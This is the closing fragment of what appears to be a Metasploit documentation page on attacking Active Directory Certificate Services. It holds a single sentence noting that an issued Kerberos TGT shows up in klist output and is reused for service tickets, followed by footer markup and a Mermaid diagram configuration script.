</code></pre></div></div><p>Once the TGT has been issued, it can be seen in the output of the <code class="language-plaintext highlighter-rouge">klist</code> command. With the TGT saved, it will automatically be used in the future to request ticket granting services (TGS) for authentication to specific services.</p><hr><footer><p><a href="#top" id="back-to-top">Back to top</a></p><p class="text-small text-grey-dk-000 mb-0"> <a href="https://github.com/rapid7/metasploit-framework/tree/master/docs/metasploit-framework.wiki/ad-certificates/Attacking-AD-CS-ESC-Vulnerabilities.md" id="edit-this-page">Edit this page on GitHub</a></p></footer></div></div><div class="search-overlay"></div></div><script type="text/javascript" src="/assets/js/toggle_mode.js"></script> <script> var config = { theme: 'default', logLevel: 'fatal', securityLevel: 'strict', startOnLoad: true, arrowMarkerAbsolute: false, er: { diagramPadding: 20, layoutDirection: 'TB', minEntityWidth: 100, minEntityHeight: 75, entityPadding: 15, stroke: 'gray', fill: 'honeydew', fontSize: 12, useMaxWidth: true, }, flowchart:{ diagramPadding: 8, htmlLabels: true, curve: 'basis', }, sequence: { diagramMarginX: 50, diagramMarginY: 10, actorMargin: 50, width: 150, height: 65, boxMargin: 10, boxTextMargin: 5, noteMargin: 10, messageMargin: 35, messageAlign: 'center', mirrorActors: true, bottomMarginAdj: 1, useMaxWidth: true, rightAngles: false, showSequenceNumbers: false, }, gantt: { titleTopMargin: 25, barHeight: 20, barGap: 4, topPadding: 50, leftPadding: 75, fontSize: 11, gridLineStartPadding: 35, fontFamily: '\'Open Sans\', sans-serif', numberSectionStyles: 4, axisFormat: '%Y-%m-%d', topAxis: false, }, }; mermaid.initialize(config); window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid')); </script>
